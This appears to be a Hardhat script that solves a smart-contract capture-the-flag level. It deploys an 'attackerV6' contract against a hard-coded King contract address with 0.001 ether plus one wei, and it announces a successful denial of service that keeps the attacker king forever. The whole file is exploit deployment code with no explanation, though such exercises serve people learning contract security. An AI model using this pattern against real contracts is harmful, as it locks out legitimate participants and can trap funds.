const { ethers } = require("hardhat");


const ATTACKER_NAME = "attackerV6";
const KingContract="0xC8C96bAbE5982494717F4478d4536DF068E6CBfA"


async function main() {
  const attackerFactory = await ethers.getContractFactory(ATTACKER_NAME);
  const etherToSend = ethers.utils.parseEther("0.001").add(1);
  const attackerContract = await attackerFactory.deploy(KingContract, {value: etherToSend});
  
  await attackerContract.deployed();
 
  console.log("contract address: ", attackerContract.address);
  console.log("DoS successfully, you are the king 4ever 🤴");

}

main().catch(error => {
  console.error(error);
  process.exit(1);
});